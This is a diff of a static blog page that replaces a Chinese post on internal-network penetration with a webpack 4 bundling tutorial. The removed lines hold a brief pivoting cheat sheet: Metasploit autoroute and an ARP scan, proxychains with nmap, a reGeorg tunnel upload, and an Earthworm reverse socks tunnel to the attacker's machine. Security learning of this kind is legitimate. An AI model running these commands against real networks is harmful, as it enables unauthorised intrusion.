@@ -96,25 +96,25 @@
 
 
 
-  <meta name="description" content="1.msf拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网 meterpreter&amp;gt;run get_local_subnets //获取子网/子网掩码  添加路由 meterpreter&amp;gt;run autoroute -s 子网/子网掩码 或 msf&amp;gt;route add 子网 子网掩码 seesion_id  内网主机存活扫描 mete">
+  <meta name="description" content="本文webpack为4.31.0  //webpack.config.jsconst path = require(&apos;path&apos;);module.exports = &amp;#123;    mode:&apos;development&apos;,      entry: &apos;./src/index.js&apos;,    output: &amp;#123;        filename: &apos;bundle.js&apos;,        p">
 <meta name="keywords" content="sinight,web安全,后端开发,前端开发,pyhton,php">
 <meta property="og:type" content="article">
-<meta property="og:title" content=" 内网渗透之进入内网		">
-<meta property="og:url" content="https://sin1ght.github.io/2018/08/05/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91/index.html">
+<meta property="og:title" content="webpack4打包原理">
+<meta property="og:url" content="https://sin1ght.github.io/2019/05/19/webpack4打包原理/index.html">
 <meta property="og:site_name" content="Sinight Awesome">
-<meta property="og:description" content="1.msf拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网 meterpreter&amp;gt;run get_local_subnets //获取子网/子网掩码  添加路由 meterpreter&amp;gt;run autoroute -s 子网/子网掩码 或 msf&amp;gt;route add 子网 子网掩码 seesion_id  内网主机存活扫描 mete">
+<meta property="og:description" content="本文webpack为4.31.0  //webpack.config.jsconst path = require(&apos;path&apos;);module.exports = &amp;#123;    mode:&apos;development&apos;,      entry: &apos;./src/index.js&apos;,    output: &amp;#123;        filename: &apos;bundle.js&apos;,        p">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-25T10:05:58.338Z">
+<meta property="og:updated_time" content="2019-05-19T06:49:50.996Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content=" 内网渗透之进入内网		">
-<meta name="twitter:description" content="1.msf拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网 meterpreter&amp;gt;run get_local_subnets //获取子网/子网掩码  添加路由 meterpreter&amp;gt;run autoroute -s 子网/子网掩码 或 msf&amp;gt;route add 子网 子网掩码 seesion_id  内网主机存活扫描 mete">
+<meta name="twitter:title" content="webpack4打包原理">
+<meta name="twitter:description" content="本文webpack为4.31.0  //webpack.config.jsconst path = require(&apos;path&apos;);module.exports = &amp;#123;    mode:&apos;development&apos;,      entry: &apos;./src/index.js&apos;,    output: &amp;#123;        filename: &apos;bundle.js&apos;,        p">
 
 
 
 
 
 
-  <link rel="canonical" href="https://sin1ght.github.io/2018/08/05/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91/">
+  <link rel="canonical" href="https://sin1ght.github.io/2019/05/19/webpack4打包原理/">
 
 
 
@@ -124,7 +124,7 @@
   };
 </script>
 
-  <title> 内网渗透之进入内网		 | Sinight Awesome</title>
+  <title>webpack4打包原理 | Sinight Awesome</title>
   
 
 
@@ -349,7 +349,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://sin1ght.github.io/2018/08/05/e5-86-85-e7-bd-91-e6-b8-97-e9-80-8f-e4-b9-8b-e8-bf-9b-e5-85-a5-e5-86-85-e7-bd-91/">
+    <link itemprop="mainEntityOfPage" href="https://sin1ght.github.io/2019/05/19/webpack4打包原理/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="sinight">
@@ -366,7 +366,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline"> 内网渗透之进入内网		
+          <h1 class="post-title" itemprop="name headline">webpack4打包原理
 
               
             
@@ -392,24 +392,12 @@
                 
               
 
-              <time title="创建时间：2018-08-05 22:41:03" itemprop="dateCreated datePublished" datetime="2018-08-05T22:41:03+08:00">2018-08-05</time>
+              <time title="创建时间：2019-05-19 13:25:10 / 修改时间：14:49:50" itemprop="dateCreated datePublished" datetime="2019-05-19T13:25:10+08:00">2019-05-19</time>
             
 
             
               
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2019-02-25 18:05:58" itemprop="dateModified" datetime="2019-02-25T18:05:58+08:00">2019-02-25</time>
               
             
           </span>
@@ -426,7 +414,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB安全/" itemprop="url" rel="index"><span itemprop="name">WEB安全</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/WEB前端-后端/" itemprop="url" rel="index"><span itemprop="name">WEB前端/后端</span></a></span>
 
                 
                 
@@ -461,37 +449,21 @@
       
 
       
-        <h3 id="1-msf"><a href="#1-msf" class="headerlink" title="1.msf"></a>1.msf</h3><p>拿到一个meterpreter会话后，msf可以很方便的通过添加路由的方式使msf可以攻击内网</p>
-<pre><code>meterpreter&gt;run get_local_subnets //获取子网/子网掩码
+        <blockquote>
+<p>本文webpack为4.31.0</p>
+</blockquote>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//webpack.config.js</span></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    mode:<span class="string">'development'</span>,  </span><br><span class="line">    entry: <span class="string">'./src/index.js'</span>,</span><br><span class="line">    output: &#123;</span><br><span class="line">        filename: <span class="string">'bundle.js'</span>,</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">'dist'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> add <span class="keyword">from</span> <span class="string">'./utils'</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">1</span>,<span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//utils.js</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> add;</span><br></pre></td></tr></table></figure>
+<p>打包后的代码</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//bundle.js</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/******/</span> (<span class="function"><span class="keyword">function</span>(<span class="params">modules</span>) </span>&#123; <span class="comment">// webpackBootstrap</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// The module cache</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="keyword">var</span> installedModules = &#123;&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// The require function</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="function"><span class="keyword">function</span> <span class="title">__webpack_require__</span>(<span class="params">moduleId</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Check if module is in cache</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(installedModules[moduleId]) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="keyword">return</span> installedModules[moduleId].exports;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Create a new module (and put it into the cache)</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> <span class="built_in">module</span> = installedModules[moduleId] = &#123;</span><br><span class="line"><span class="comment">/******/</span> 			i: moduleId,</span><br><span class="line"><span class="comment">/******/</span> 			l: <span class="literal">false</span>,</span><br><span class="line"><span class="comment">/******/</span> 			exports: &#123;&#125;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Execute the module function</span></span><br><span class="line"><span class="comment">/******/</span> 		modules[moduleId].call(<span class="built_in">module</span>.exports, <span class="built_in">module</span>, <span class="built_in">module</span>.exports, __webpack_require__);</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Flag the module as loaded</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">module</span>.l = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Return the exports of the module</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// expose the modules object (__webpack_modules__)</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.m = modules;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// expose the module cache</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.c = installedModules;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// define getter function for harmony exports</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.d = <span class="function"><span class="keyword">function</span>(<span class="params">exports, name, getter</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(!__webpack_require__.o(exports, name)) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="built_in">Object</span>.defineProperty(exports, name, &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">get</span>: getter &#125;);</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// define __esModule on exports</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.r = <span class="function"><span class="keyword">function</span>(<span class="params">exports</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(<span class="keyword">typeof</span> <span class="built_in">Symbol</span> !== <span class="string">'undefined'</span> &amp;&amp; <span class="built_in">Symbol</span>.toStringTag) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="built_in">Object</span>.defineProperty(exports, <span class="built_in">Symbol</span>.toStringTag, &#123; <span class="attr">value</span>: <span class="string">'Module'</span> &#125;);</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">Object</span>.defineProperty(exports, <span class="string">'__esModule'</span>, &#123; <span class="attr">value</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// create a fake namespace object</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 1: value is a module id, require it</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 2: merge all properties of value into the ns</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 4: return value when already ns object</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// mode &amp; 8|1: behave like require</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.t = <span class="function"><span class="keyword">function</span>(<span class="params">value, mode</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(mode &amp; <span class="number">1</span>) value = __webpack_require__(value);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(mode &amp; <span class="number">8</span>) <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>((mode &amp; <span class="number">4</span>) &amp;&amp; <span class="keyword">typeof</span> value === <span class="string">'object'</span> &amp;&amp; value &amp;&amp; value.__esModule) <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> ns = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">/******/</span> 		__webpack_require__.r(ns);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">Object</span>.defineProperty(ns, <span class="string">'default'</span>, &#123; <span class="attr">enumerable</span>: <span class="literal">true</span>, <span class="attr">value</span>: value &#125;);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(mode &amp; <span class="number">2</span> &amp;&amp; <span class="keyword">typeof</span> value != <span class="string">'string'</span>) <span class="keyword">for</span>(<span class="keyword">var</span> key <span class="keyword">in</span> value) __webpack_require__.d(ns, key, <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123; <span class="keyword">return</span> value[key]; &#125;.bind(<span class="literal">null</span>, key));</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> ns;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// getDefaultExport function for compatibility with non-harmony modules</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.n = <span class="function"><span class="keyword">function</span>(<span class="params">module</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> getter = <span class="built_in">module</span> &amp;&amp; <span class="built_in">module</span>.__esModule ?</span><br><span class="line"><span class="comment">/******/</span> 			<span class="function"><span class="keyword">function</span> <span class="title">getDefault</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">module</span>[<span class="string">'default'</span>]; &#125; :</span><br><span class="line"><span class="comment">/******/</span> 			<span class="function"><span class="keyword">function</span> <span class="title">getModuleExports</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">module</span>; &#125;;</span><br><span class="line"><span class="comment">/******/</span> 		__webpack_require__.d(getter, <span class="string">'a'</span>, getter);</span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> getter;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// Object.prototype.hasOwnProperty.call</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.o = <span class="function"><span class="keyword">function</span>(<span class="params">object, property</span>) </span>&#123; <span class="keyword">return</span> <span class="built_in">Object</span>.prototype.hasOwnProperty.call(object, property); &#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// __webpack_public_path__</span></span><br><span class="line"><span class="comment">/******/</span> 	__webpack_require__.p = <span class="string">""</span>;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="comment">// Load entry module and return exports</span></span><br><span class="line"><span class="comment">/******/</span> 	<span class="keyword">return</span> __webpack_require__(__webpack_require__.s = <span class="string">"./src/index.js"</span>);</span><br><span class="line"><span class="comment">/******/</span> &#125;)</span><br><span class="line"><span class="comment">/************************************************************************/</span></span><br><span class="line"><span class="comment">/******/</span> (&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> <span class="string">"./src/index.js"</span>:</span><br><span class="line"><span class="comment">/*!**********************!*\</span></span><br><span class="line"><span class="comment">  !*** ./src/index.js ***!</span></span><br><span class="line"><span class="comment">  \**********************/</span></span><br><span class="line"><span class="comment">/*! no exports provided */</span></span><br><span class="line"><span class="comment">/***/</span> (<span class="function"><span class="keyword">function</span>(<span class="params">module, __webpack_exports__, __webpack_require__</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./utils */ \"./src/utils.js\");\n\r\n\r\nconsole.log('hello webpack');\r\nconsole.log(Object(_utils__WEBPACK_IMPORTED_MODULE_0__[\"default\"])(1,2));\n\n//# sourceURL=webpack:///./src/index.js?"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> &#125;),</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> <span class="string">"./src/utils.js"</span>:</span><br><span class="line"><span class="comment">/*!**********************!*\</span></span><br><span class="line"><span class="comment">  !*** ./src/utils.js ***!</span></span><br><span class="line"><span class="comment">  \**********************/</span></span><br><span class="line"><span class="comment">/*! exports provided: default */</span></span><br><span class="line"><span class="comment">/***/</span> (<span class="function"><span class="keyword">function</span>(<span class="params">module, __webpack_exports__, __webpack_require__</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">"__webpack_require__.r(__webpack_exports__);\nfunction add(a,b)&#123;\r\n    return a+b;\r\n&#125;\r\n\r\n/* harmony default export */ __webpack_exports__[\"default\"] = (add);\n\n//# sourceURL=webpack:///./src/utils.js?"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/***/</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/******/</span> &#125;);</span><br></pre></td></tr></table></figure>
+<p>可以看到整个文件是一个立即执行函数，参数是一个对象，对象属性名称是js文件的路径，属性值是一个函数，函数接受三个参数<code>module</code>，<code>__webpack_exports__</code>，<code>__webpack_require__</code>，函数内部的<code>eval</code>函数里面是js文件的源代码，但是把<code>import</code>变成了<code>__webpack_require__()</code>，<code>export default</code>变成了<code>__webpack_exports__[&quot;default&quot;]</code></p>
+<p><code>__webpack_require__</code>的定义在立即执行函数里面<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__webpack_require__</span>(<span class="params">moduleId</span>) </span>&#123;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Check if module is in cache</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">if</span>(installedModules[moduleId]) &#123;</span><br><span class="line"><span class="comment">/******/</span> 			<span class="keyword">return</span> installedModules[moduleId].exports;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;</span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Create a new module (and put it into the cache)</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">var</span> <span class="built_in">module</span> = installedModules[moduleId] = &#123;</span><br><span class="line"><span class="comment">/******/</span> 			i: moduleId,</span><br><span class="line"><span class="comment">/******/</span> 			l: <span class="literal">false</span>,</span><br><span class="line"><span class="comment">/******/</span> 			exports: &#123;&#125;</span><br><span class="line"><span class="comment">/******/</span> 		&#125;;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Execute the module function</span></span><br><span class="line"><span class="comment">/******/</span> 		modules[moduleId].call(<span class="built_in">module</span>.exports, <span class="built_in">module</span>, <span class="built_in">module</span>.exports, __webpack_require__);</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Flag the module as loaded</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="built_in">module</span>.l = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/******/</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="comment">// Return the exports of the module</span></span><br><span class="line"><span class="comment">/******/</span> 		<span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line"><span class="comment">/******/</span> 	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到定义了一个<code>module</code>对象，对象包含一个<code>exports</code>对象，通过<code>moduleId(js文件路径)</code>，获取到了被包装成函数的js文件，并传入了<code>module</code>, <code>module.exports</code>, <code>__webpack_require__</code>进行调用，巧妙的通过传入<code>module.exports</code>引用，将模块内部对外的接口附加在了<code>module.exports</code>上，函数最后返回了<code>module.exports</code>对象。</p>
+<p>被包装成函数的index.js文件(我把eval函数去掉了，方便看些)<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">module, __webpack_exports__, __webpack_require__</span>) </span>&#123;</span><br><span class="line"><span class="meta">"use strict"</span>;</span><br><span class="line"></span><br><span class="line">__webpack_require__.r(__webpack_exports__);<span class="comment">/* harmony import */</span> </span><br><span class="line"><span class="keyword">var</span> _utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(<span class="string">"./src/utils.js"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'hello webpack'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>(_utils__WEBPACK_IMPORTED_MODULE_0__[<span class="string">"default"</span>])(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment">//# sourceURL=webpack:///./src/index.js?;</span></span><br><span class="line"><span class="comment">/***/</span> &#125;</span><br></pre></td></tr></table></figure></p>
+<p>通过<code>__webpack_require__(&quot;./src/utils.js&quot;)</code>导入，获取exports对象，然后通过<code>_utils__WEBPACK_IMPORTED_MODULE_0__[&quot;default&quot;]</code>调用接口(这是export default的调用方式，如果是export，default就变成具体的名字)。</p>
 
-添加路由
-meterpreter&gt;run autoroute -s 子网/子网掩码
-或
-msf&gt;route add 子网 子网掩码 seesion_id
-
-内网主机存活扫描
-meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
-</code></pre><p>使nmap等工具也可以扫描内网</p>
-<pre><code>1.scoks4代理（支持tcp,sock5支持tcp/udp）
-use auxiliary/server/socks4a
-
-2.proxychains/proxifier等全局代理软件
-proxychains4 nmap -sT ip
-</code></pre><a id="more"></a>
-<h3 id="2-proxychains-proxifier-reGeorg"><a href="#2-proxychains-proxifier-reGeorg" class="headerlink" title="2.proxychains/proxifier+reGeorg"></a>2.proxychains/proxifier+reGeorg</h3><pre><code>1.上传tunnel脚本到靶机
-2.python reGeorgSocksProxy.py -u http://ip/tunnel //开启socks服务
-3.配置proxychains/proxifier使用socks服务
-</code></pre><h3 id="3-Earthworm-socks5代理"><a href="#3-Earthworm-socks5代理" class="headerlink" title="3.Earthworm(socks5代理)"></a>3.Earthworm(socks5代理)</h3><p>1.正向，在靶机开启socks服务</p>
-<pre><code>ew –s ssocksd –l 888
-</code></pre><p>2.反向</p>
-<pre><code>本机添加一个转接隧道，把1080端口收到的代理请求转交给888端口
-ew -s rcsocks -l 1008 -e 888
-
-在靶机上开启socks服务，并反弹到本机888端口上
-ew -s rssocks -d 本机ip -e 888
-
-接下来就可以配置全局代理软件访问本机1008端口使用靶机socks服务了
-</code></pre>
       
     </div>
 
@@ -521,8 +493,8 @@ ew -s rssocks -d 本机ip -e 888
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/08/05/nishang-powersploit/" rel="next" title=" Nishang/PowerSploit		">
-                <i class="fa fa-chevron-left"></i>  Nishang/PowerSploit		
+              <a href="/2019/02/24/nginx-location-e8-a7-84-e5-88-99/" rel="next" title=" Nginx location规则		">
+                <i class="fa fa-chevron-left"></i>  Nginx location规则		
               </a>
             
           </div>
@@ -530,10 +502,6 @@ ew -s rssocks -d 本机ip -e 888
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/08/12/flasknginxuwsgi-e9-85-8d-e7-bd-ae/" rel="prev" title=" flask+nginx+uwsgi配置		">
-                 flask+nginx+uwsgi配置		 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -577,17 +545,8 @@ ew -s rssocks -d 本机ip -e 888
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <div class="site-overview-wrap sidebar-panel">
+      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -715,23 +674,6 @@ ew -s rssocks -d 本机ip -e 888
         </div>
       </div>
 
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-msf"><span class="nav-number">1.</span> <span class="nav-text">1.msf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-proxychains-proxifier-reGeorg"><span class="nav-number">2.</span> <span class="nav-text">2.proxychains/proxifier+reGeorg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Earthworm-socks5代理"><span class="nav-number">3.</span> <span class="nav-text">3.Earthworm(socks5代理)</span></a></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
       
 
       
